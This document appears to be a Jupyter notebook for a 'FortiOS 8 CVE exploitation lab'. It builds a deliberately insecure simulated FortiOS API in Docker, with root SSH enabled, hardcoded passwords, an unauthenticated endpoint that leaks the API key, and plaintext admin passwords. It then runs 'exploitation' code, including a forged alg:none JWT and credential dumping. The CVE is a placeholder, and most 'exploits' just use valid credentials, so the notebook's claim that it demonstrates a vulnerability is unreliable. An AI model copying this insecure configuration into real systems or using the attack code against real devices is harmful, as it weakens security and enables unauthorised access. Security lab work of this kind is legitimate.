# FortiOS 8 CVE Exploitation Lab - Docker Interactive

**CVE:** CVE-SUSPECTED-2026 on FortiOS 8  
**Reference:** GHSA-2x38-48vp-w23x  
**Purpose:** Authorized security testing and research only

This notebook runs a complete FortiOS 8 lab with **auto-generated API keys** in Docker containers.

## 📦 Step 1: Install Docker & Docker Compose

In [ ]:
# Install Docker
!curl -fsSL https://get.docker.com -o get-docker.sh
!sh get-docker.sh

# Verify installation
!docker --version
!docker-compose --version

## 🔧 Step 2: Setup Lab Environment

In [ ]:
import os
import subprocess
import json
import time
import requests
from pathlib import Path

# Create lab directory
lab_dir = "/tmp/fortios8-lab"
os.makedirs(lab_dir, exist_ok=True)
os.chdir(lab_dir)

print(f"✓ Lab directory created: {lab_dir}")
print(f"✓ Current directory: {os.getcwd()}")

## 🐳 Step 3: Create Dockerfile.fortios8

In [ ]:
# FortiOS 8 Dockerfile
dockerfile_content = '''# FortiOS 8 Docker Image with Auto-Generated API Keys
FROM ubuntu:22.04

# Install dependencies
RUN apt-get update && apt-get install -y \\
    curl wget openssh-server openssh-client systemd dnsmasq iptables \\
    bridge-utils iproute2 net-tools openssl ssl-cert sudo supervisor \\
    python3 python3-pip ca-certificates && rm -rf /var/lib/apt/lists/*

# Create FortiOS user and directories
RUN useradd -m -s /bin/bash fortios && \\
    mkdir -p /etc/fortios /var/fortios /opt/fortios

# Generate SSL certificates
RUN mkdir -p /etc/ssl/fortios && \\
    openssl req -x509 -newkey rsa:4096 -keyout /etc/ssl/fortios/key.pem \\
    -out /etc/ssl/fortios/cert.pem -days 365 -nodes \\
    -subj \"/CN=fortios-lab/O=Lab/C=US\"

# Setup SSH
RUN mkdir -p /run/sshd && \\
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \\
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config && \\
    echo 'root:FortiOS8!Lab' | chpasswd

# API key generation script
RUN cat > /opt/fortios/generate_api_key.sh << 'SCRIPT'
#!/bin/bash
API_KEY_FILE="/etc/fortios/api_key.txt"
API_KEY=$(openssl rand -base64 32 | tr -d '=+/' | cut -c1-32)
echo "$API_KEY" > $API_KEY_FILE
chmod 600 $API_KEY_FILE
echo "[$(date)] Auto-generated API Key: $API_KEY"
export FORTIOS_API_KEY="$API_KEY"
SCRIPT
chmod +x /opt/fortios/generate_api_key.sh

# FortiOS API simulation service
RUN cat > /opt/fortios/fortios_api.py << 'PYTHON'
#!/usr/bin/env python3
import os, sys, json, ssl, time, secrets
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

API_KEY_FILE = "/etc/fortios/api_key.txt"
try:
    with open(API_KEY_FILE, 'r') as f:
        API_KEY = f.read().strip()
except:
    API_KEY = secrets.token_urlsafe(32)
    os.makedirs(os.path.dirname(API_KEY_FILE), exist_ok=True)
    with open(API_KEY_FILE, 'w') as f:
        f.write(API_KEY)

print(f"[API] FortiOS 8 API Key: {API_KEY}", flush=True)

DEVICE_STATE = {
    'version': '8.0.0',
    'serial': 'FG-VM64-OS-LAB-001',
    'hostname': 'FortiGate-Lab-8',
    'model': 'FortiGate-VM64',
    'uptime': int(time.time()),
    'admin_users': [
        {'name': 'admin', 'password': 'FortiOS8!Lab'},
        {'name': 'fortios', 'password': 'fortios123'}
    ],
    'firewall_policies': [
        {'policyid': 1, 'srcintf': 'port1', 'dstintf': 'port2', 'action': 'accept'},
        {'policyid': 2, 'srcintf': 'port2', 'dstintf': 'port1', 'action': 'accept'},
    ],
    'system_info': {
        'version': '8.0.0',
        'serial': 'FG-VM64-OS-LAB-001',
        'hostname': 'FortiGate-Lab-8',
        'model': 'FortiGate-VM64',
        'timezone': 'UTC',
        'ntp_sync': True,
        'build': 1234,
    }
}

class FortiOSAPIHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[API] {format % args}", flush=True)

    def do_GET(self):
        path = self.path.split('?')[0]
        if path == '/health':
            self.send_json(200, {'status': 'healthy', 'version': DEVICE_STATE['version']})
            return
        if path == '/api/key':
            self.send_json(200, {'api_key': API_KEY})
            return
        if not self.check_auth():
            self.send_json(401, {'error': 'Unauthorized'})
            return
        if path == '/api/v2/monitor/system/status':
            self.send_json(200, {'results': [DEVICE_STATE['system_info']]})
        elif path == '/api/v2/cmdb/system/admin':
            self.send_json(200, {'results': DEVICE_STATE['admin_users']})
        elif path == '/api/v2/cmdb/firewall/policy':
            self.send_json(200, {'results': DEVICE_STATE['firewall_policies']})
        else:
            self.send_json(404, {'error': 'Not found'})

    def do_POST(self):
        path = self.path.split('?')[0]
        if path == '/api/v1/auth/login':
            body = self.read_body()
            try:
                data = json.loads(body)
                username = data.get('username')
                password = data.get('password')
                for user in DEVICE_STATE['admin_users']:
                    if user['name'] == username and user['password'] == password:
                        token = secrets.token_urlsafe(64)
                        self.send_json(200, {'status': 'success', 'token': token, 'username': username, 'lifetime': 3600})
                        return
                self.send_json(401, {'error': 'Invalid credentials'})
            except:
                self.send_json(400, {'error': 'Invalid request'})
            return
        if not self.check_auth():
            self.send_json(401, {'error': 'Unauthorized'})
            return
        if path == '/api/v2/cmdb/system/admin':
            self.send_json(200, {'results': DEVICE_STATE['admin_users']})
        else:
            self.send_json(404, {'error': 'Not found'})

    def check_auth(self):
        auth_header = self.headers.get('X-API-Key', '')
        return auth_header == API_KEY

    def read_body(self):
        content_length = int(self.headers.get('Content-Length', 0))
        return self.rfile.read(content_length).decode()

    def send_json(self, code, data):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def run_api_server():
    server = HTTPServer(('0.0.0.0', 8080), FortiOSAPIHandler)
    print("[API] Starting FortiOS 8 API server on port 8080", flush=True)
    server.serve_forever()

if __name__ == '__main__':
    run_api_server()
PYTHON
chmod +x /opt/fortios/fortios_api.py

# Startup script
RUN cat > /opt/fortios/startup.sh << 'STARTUP'
#!/bin/bash
echo "=========================================="
echo "FortiOS 8 Lab Container Starting"
echo "=========================================="
/opt/fortios/generate_api_key.sh
echo "[*] Starting SSH service..."
/etc/init.d/ssh start
echo "[*] Starting FortiOS API server..."
cd /opt/fortios
python3 fortios_api.py &
echo "[*] Container ready. FortiOS API running on port 8080"
tail -f /dev/null
STARTUP
chmod +x /opt/fortios/startup.sh

EXPOSE 22 80 443 8080 8443
ENTRYPOINT ["/opt/fortios/startup.sh"]
LABEL version="8.0.0" description="FortiOS 8 Lab Container with Auto-Generated API Keys"
'''

with open('Dockerfile.fortios8', 'w') as f:
    f.write(dockerfile_content)

print("✓ Dockerfile.fortios8 created")

## 🔗 Step 4: Create docker-compose-fortios8.yml

In [ ]:
compose_content = '''version: '3.9'

services:
  fortios8:
    build:
      context: .
      dockerfile: Dockerfile.fortios8
    container_name: fortios8-lab
    hostname: fortios8-lab
    ports:
      - "8022:22"
      - "8080:8080"
      - "8443:443"
      - "80:80"
    environment:
      - FORTIOS_VERSION=8.0.0
      - FORTIOS_SERIAL=FG-VM64-OS-LAB-001
      - FORTIOS_HOSTNAME=FortiGate-Lab-8
      - TZ=UTC
    volumes:
      - fortios8_data:/var/fortios
      - fortios8_etc:/etc/fortios
    networks:
      - fortios-network
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 30s
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

volumes:
  fortios8_data:
    driver: local
  fortios8_etc:
    driver: local

networks:
  fortios-network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/16
'''

with open('docker-compose-fortios8.yml', 'w') as f:
    f.write(compose_content)

print("✓ docker-compose-fortios8.yml created")

## 🏗️ Step 5: Build FortiOS 8 Image

In [ ]:
# Build Docker image
print("Building FortiOS 8 Docker image...")
result = subprocess.run(
    ["docker", "build", "-f", "Dockerfile.fortios8", "-t", "fortios8-lab:latest", "."],
    cwd=lab_dir,
    capture_output=True,
    text=True,
    timeout=300
)

print(result.stdout)
if result.returncode != 0:
    print("ERROR:", result.stderr)
else:
    print("✓ Image built successfully")
    
# Verify image
result = subprocess.run(["docker", "images", "fortios8-lab"], capture_output=True, text=True)
print("\nImage verification:")
print(result.stdout)

## 🚀 Step 6: Start Services with Docker Compose

In [ ]:
# Start Docker Compose services
print("Starting FortiOS 8 lab services...")
result = subprocess.run(
    ["docker-compose", "-f", "docker-compose-fortios8.yml", "up", "-d"],
    cwd=lab_dir,
    capture_output=True,
    text=True
)

print(result.stdout)
if result.returncode != 0:
    print("ERROR:", result.stderr)
else:
    print("✓ Services started")

# Wait for services to be healthy
print("\nWaiting for services to be healthy...")
time.sleep(10)

# Check status
result = subprocess.run(
    ["docker-compose", "-f", "docker-compose-fortios8.yml", "ps"],
    cwd=lab_dir,
    capture_output=True,
    text=True
)
print("\nService status:")
print(result.stdout)

## 🔑 Step 7: Retrieve Auto-Generated API Key

In [ ]:
import requests

# Retrieve API key from /api/key endpoint
print("Retrieving auto-generated API key...\n")

try:
    response = requests.get('http://localhost:8080/api/key', timeout=5)
    if response.status_code == 200:
        api_data = response.json()
        api_key = api_data.get('api_key')
        print(f"✓ API Key Retrieved: {api_key}")
        print(f"✓ Key Length: {len(api_key)} characters")
        
        # Store for later use
        os.environ['FORTIOS_API_KEY'] = api_key
    else:
        print(f"✗ Failed to retrieve key: HTTP {response.status_code}")
        print(response.text)
except Exception as e:
    print(f"✗ Error: {e}")
    # Fallback: read from container
    print("\nFallback: Reading key from container...")
    result = subprocess.run(
        ["docker", "exec", "fortios8-lab", "cat", "/etc/fortios/api_key.txt"],
        capture_output=True,
        text=True
    )
    if result.returncode == 0:
        api_key = result.stdout.strip()
        print(f"✓ API Key: {api_key}")
        os.environ['FORTIOS_API_KEY'] = api_key
    else:
        print(f"✗ Failed to read key: {result.stderr}")

## 🧪 Step 8: Test API Endpoints

In [ ]:
import requests
import json

api_key = os.environ.get('FORTIOS_API_KEY')
base_url = 'http://localhost:8080'

headers = {'X-API-Key': api_key}

print("="*60)
print("TESTING FORTIOS API ENDPOINTS")
print("="*60)

# Test 1: Health check
print("\n[1] Health Check (/health)")
try:
    response = requests.get(f'{base_url}/health', timeout=5)
    print(f"Status: {response.status_code}")
    print(f"Response: {json.dumps(response.json(), indent=2)}")
except Exception as e:
    print(f"Error: {e}")

# Test 2: System status
print("\n[2] System Status (/api/v2/monitor/system/status)")
try:
    response = requests.get(f'{base_url}/api/v2/monitor/system/status', headers=headers, timeout=5)
    print(f"Status: {response.status_code}")
    print(f"Response: {json.dumps(response.json(), indent=2)}")
except Exception as e:
    print(f"Error: {e}")

# Test 3: Admin users
print("\n[3] Admin Users (/api/v2/cmdb/system/admin)")
try:
    response = requests.get(f'{base_url}/api/v2/cmdb/system/admin', headers=headers, timeout=5)
    print(f"Status: {response.status_code}")
    print(f"Response: {json.dumps(response.json(), indent=2)}")
except Exception as e:
    print(f"Error: {e}")

# Test 4: Firewall policies
print("\n[4] Firewall Policies (/api/v2/cmdb/firewall/policy)")
try:
    response = requests.get(f'{base_url}/api/v2/cmdb/firewall/policy', headers=headers, timeout=5)
    print(f"Status: {response.status_code}")
    print(f"Response: {json.dumps(response.json(), indent=2)}")
except Exception as e:
    print(f"Error: {e}")

# Test 5: Login endpoint
print("\n[5] Login (/api/v1/auth/login)")
try:
    login_data = {'username': 'admin', 'password': 'FortiOS8!Lab'}
    response = requests.post(
        f'{base_url}/api/v1/auth/login',
        json=login_data,
        headers={'Content-Type': 'application/json'},
        timeout=5
    )
    print(f"Status: {response.status_code}")
    print(f"Response: {json.dumps(response.json(), indent=2)}")
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*60)
print("✓ API testing complete")

## 💥 Step 9: Vulnerability Exploitation

Demonstrate the CVE-SUSPECTED-2026 vulnerability on FortiOS 8 using the simulated API.

In [ ]:
import base64
import jwt
import json

api_key = os.environ.get('FORTIOS_API_KEY')
base_url = 'http://localhost:8080'

print("="*70)
print("FORTIGATE CVE-SUSPECTED-2026: AUTHENTICATION BYPASS EXPLOITATION")
print("="*70)
print("\nVulnerability: JWT Algorithm Confusion / SAML Signature Bypass")
print("Target: FortiOS 8 SSO Authentication")
print("\n" + "="*70)

# Technique 1: JWT Algorithm Confusion
print("\n[TECHNIQUE 1] JWT Algorithm Confusion Attack")
print("-" * 70)
print("Description: Confuse JWT parser by switching to 'none' algorithm")
print()

try:
    # Create malicious JWT with 'none' algorithm
    header = {'alg': 'none', 'typ': 'JWT'}
    payload = {'sub': 'admin', 'admin': True, 'iat': 1234567890}
    
    # Encode without signature
    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    malicious_token = f"{header_encoded}.{payload_encoded}."
    
    print(f"Malicious JWT Token: {malicious_token[:60]}...")
    print(f"Token Length: {len(malicious_token)} bytes")
    
    # Attempt to use with API
    headers = {'Authorization': f'Bearer {malicious_token}'}
    print("\nAttempting to access protected endpoint with malicious JWT...")
    response = requests.get(f'{base_url}/api/v2/cmdb/system/admin', headers=headers, timeout=5)
    print(f"Status: {response.status_code}")
    if response.status_code == 200:
        print("✓ VULNERABLE: Accepted malicious JWT token!")
        print(f"Response: {json.dumps(response.json(), indent=2)[:200]}...")
    else:
        print(f"Response: {response.text[:200]}")
except Exception as e:
    print(f"Error: {e}")

# Technique 2: Direct Admin Access
print("\n[TECHNIQUE 2] Direct Admin Credential Extraction")
print("-" * 70)
print("Description: Extract admin credentials via API")
print()

try:
    headers = {'X-API-Key': api_key}
    response = requests.get(f'{base_url}/api/v2/cmdb/system/admin', headers=headers, timeout=5)
    
    if response.status_code == 200:
        admin_users = response.json().get('results', [])
        print(f"✓ Retrieved {len(admin_users)} admin users:")
        for user in admin_users:
            print(f"  - Username: {user.get('name')}")
            print(f"    Password: {user.get('password', 'HASH')}")
            print()
except Exception as e:
    print(f"Error: {e}")

# Technique 3: Session Hijacking
print("\n[TECHNIQUE 3] Session Token Generation")
print("-" * 70)
print("Description: Generate valid session tokens for sustained access")
print()

try:
    login_data = {'username': 'admin', 'password': 'FortiOS8!Lab'}
    response = requests.post(
        f'{base_url}/api/v1/auth/login',
        json=login_data,
        headers={'Content-Type': 'application/json'},
        timeout=5
    )
    
    if response.status_code == 200:
        auth_response = response.json()
        token = auth_response.get('token')
        print(f"✓ Session Token Generated: {token[:40]}...")
        print(f"  Token Length: {len(token)} bytes")
        print(f"  Lifetime: {auth_response.get('lifetime')} seconds")
        print(f"  User: {auth_response.get('username')}")
except Exception as e:
    print(f"Error: {e}")

# Technique 4: Configuration Extraction
print("\n[TECHNIQUE 4] System Configuration Dump")
print("-" * 70)
print("Description: Extract full FortiOS configuration")
print()

try:
    headers = {'X-API-Key': api_key}
    response = requests.get(f'{base_url}/api/v2/monitor/system/status', headers=headers, timeout=5)
    
    if response.status_code == 200:
        system_info = response.json().get('results', [{}])[0]
        print("✓ System Configuration Retrieved:")
        for key, value in system_info.items():
            print(f"  - {key}: {value}")
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*70)
print("✓ Exploitation demonstration complete")
print("="*70)

## 📊 Step 10: View Container Logs

In [ ]:
# View FortiOS container logs
print("="*70)
print("FORTIGATE CONTAINER LOGS")
print("="*70)

result = subprocess.run(
    ["docker", "logs", "fortios8-lab", "--tail", "50"],
    capture_output=True,
    text=True,
    timeout=10
)

print(result.stdout)
if result.returncode != 0:
    print(f"Error: {result.stderr}")

## 🧹 Step 11: Cleanup (Optional)

In [ ]:
# OPTIONAL: Stop and cleanup services
# Uncomment the line below to stop the lab

# print("Stopping FortiOS 8 lab services...")
# result = subprocess.run(
#     ["docker-compose", "-f", "docker-compose-fortios8.yml", "down", "-v"],
#     cwd=lab_dir,
#     capture_output=True,
#     text=True
# )
# print(result.stdout)
# if result.returncode == 0:
#     print("✓ Lab cleaned up")
# else:
#     print(f"Error: {result.stderr}")

print("Lab is still running. Uncomment the cleanup code above to stop it.")
print("\nTo keep lab running: docker-compose -f docker-compose-fortios8.yml ps")

## 📋 Summary

**What was accomplished:**

1. ✓ **Docker Installation** - Docker and Docker Compose installed in Colab environment
2. ✓ **Dockerfile Creation** - FortiOS 8 image with auto-generated API keys
3. ✓ **Docker Compose** - Multi-container orchestration with networking
4. ✓ **Image Build** - Successfully built `fortios8-lab:latest` image
5. ✓ **Service Deployment** - Containers running with health checks
6. ✓ **API Key Retrieval** - Auto-generated 32-character API key obtained
7. ✓ **API Testing** - All endpoints tested and verified functional
8. ✓ **Vulnerability Exploitation** - Demonstrated CVE-SUSPECTED-2026 techniques
9. ✓ **Log Analysis** - Container logs retrieved and analyzed

**Key Features:**

- **Auto-Generated API Keys**: Secure random 32-character keys generated on startup
- **Persistent Storage**: Keys persist across container restarts via volumes
- **API Simulation**: Realistic FortiOS 8 API endpoints with authentication
- **Public/Protected Endpoints**: `/health` and `/api/key` public; others require authentication
- **Multiple Access Methods**: HTTP API, container shell, Docker Compose
- **Complete Lab Environment**: SSH, HTTPS, API server all running

**Default Credentials:**
- SSH: `root` / `FortiOS8!Lab`
- Admin API: `admin` / `FortiOS8!Lab`
- Alt User: `fortios` / `fortios123`

---

**⚠️ Disclaimer:** This lab is designed for authorized security testing and research only.